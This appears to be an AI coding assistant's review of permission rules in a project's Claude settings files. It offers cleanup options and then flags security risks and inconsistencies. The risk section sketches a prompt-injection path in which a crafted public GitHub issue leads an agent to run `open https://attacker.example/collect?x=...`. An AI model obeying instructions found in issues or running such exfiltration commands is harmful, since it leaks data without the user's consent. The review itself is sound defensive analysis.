Looking at the three files, there's real clutter to clean up: a lot of one-off, never-to-repeat exact-match Bash rules (hardcoded commit hashes, exact `sed -n` line ranges, ultra-specific `node -e` one-liners), permissions duplicated between the project and local settings files, and some stale entries (an old UUID-named Atlassian MCP server that's since been superseded by `mcp__atlassian__*`, plus a batch of WebFetch domains — Crunchbase, Companies House, Bloomberg LEI, etc. — that look unrelated to this footy codebase).

Before I start editing, let me confirm scope and how aggressive to be, since pruning permission rules affects what prompts you in future sessions.

options.label: Dedupe + remove dead one-offs (Recommended)
options.description: Remove exact-match rules that can't realistically match again (hardcoded commit hashes, specific sed line ranges, one-time cp/rm commands), remove duplicates between project and local settings, drop the stale UUID-named Atlassian MCP entries superseded by mcp__atlassian__*. Keep all reusable prefix rules (e.g. Bash(git log *)) and all domain allowlists as-is.

options.label: Also prune unrelated domains
options.description: Everything in the recommended option, plus remove the WebFetch domain entries that look unrelated to this footy project (Crunchbase, Companies House, Bloomberg LEI, tracxn.com, etc. — these look like leftovers from an unrelated research task).

options.label: Just reorganize, don't remove anything
options.description: Sort/group the arrays for readability and flag what looks stale, but leave every existing rule in place — you decide later what to delete.

Reviewed `.claude/settings.json` (the committed, team-shared, publicly-visible file) against what changed. Findings:

## Risks

**High — `Bash(open *)`.** This is meaningfully different in a shared, public-repo file than in your personal local settings. `open` launches arbitrary files/URLs with the OS default handler, unscoped. Combined with the `gh issue view *` / `gh pr view *` permissions already granted, this creates a prompt-injection path: anyone can post a crafted issue or PR description on the public repo, and if Claude reads it while helping a teammate, it could act on embedded instructions like `open https://attacker.example/collect?x=...` without a permission prompt. Fine as a personal convenience in `settings.local.json`; risky as a team-wide, unattended default.

**Medium — `mcp__atlassian__*` mixes read and write.** `createJiraIssue`, `editJiraIssue`, and `addCommentToJiraIssue` are state-changing, alongside the read-only lookups (`getAccessibleAtlassianResources`, `searchJiraIssuesUsingJql`, etc.). Auto-approving Jira mutations for every contributor via a committed, publicly-visible file is a bigger blast radius than the read-only entries — worth a deliberate yes/no rather than inheriting it from a personal copy-paste.

## Inconsistencies

- **`Skill(artifact-design)` copied without its wildcard sibling.** Your local file has both `Skill(artifact-design)` and `Skill(artifact-design:*)`; only the bare form made it into the committed file. Skill invocations with arguments won't match without the wildcard — looks like a partial copy.
- **`mcp__filesystem__read_text_file` disappeared.** It was in this file before and isn't now. If that was deliberate (e.g., no one uses that MCP server), fine — but it looks like it may have been dropped rather than intentionally removed during the copy.
- **`terraform plan` is declared "routine" but not allowed.** `autoMode.environment` (line 46 in the global file) explicitly lists `terraform (validate/plan)` as routine, but only `fmt`/`validate`/`version` made it into `permissions.allow` — `plan` is missing, so it'll still prompt despite being called out as expected.
- **`op run` — the project's own documented secrets wrapper — isn't allow-listed.** CLAUDE.md requires `op run --env-file ./.env --` for every command touching secrets, and `autoMode.environment` calls it routine. Only `op --version` made it in; the actual wrapper (`Bash(op run:*)`, present in your global personal settings) didn't.
- **`testcontainers.com` has no basis in this codebase** — I grepped `package.json` and there's no Testcontainers dependency. Looks like a personal-workflow leftover rather than something relevant to this project.
- **`code --list-extensions` and `support.apple.com`** are machine/editor diagnostics, not project workflow — lower value committed team-wide than in your personal local file.

## Missing entries at a similar level

- `Bash(git branch *)` — read-only, fits right alongside the existing `git log/diff/blame/show/stash/status` set; currently absent.
- Docker diagnostics: `Bash(docker compose ps *)`, `Bash(docker compose logs *)`, `Bash(docker ps *)` — the project's dev workflow depends on Docker Compose (MariaDB + Mailpit; `docker-compose.yml`/`docker-compose.ci.yml`/`docker-compose.prod.yml` all exist) yet there isn't a single Docker permission in the shared file.
- Stack doc domains, matching the `mantine.dev` precedent you just added but covering the rest of the stack: `nextjs.org`, `prisma.io`/`www.prisma.io`, `mariadb.com`, `docs.sentry.io`. (Skip Microsoft/Azure/Graph docs — the Microsoft Learn MCP server already covers those without needing a WebFetch domain rule.)

One I'd deliberately *not* add despite the pattern: `Bash(gh api *)`. It looks like a natural sibling to `gh issue/pr/run`, but unlike those subcommands, `gh api` can POST/PATCH/DELETE against any endpoint — auto-approving it team-wide would silently pre-approve mutating GitHub API calls.
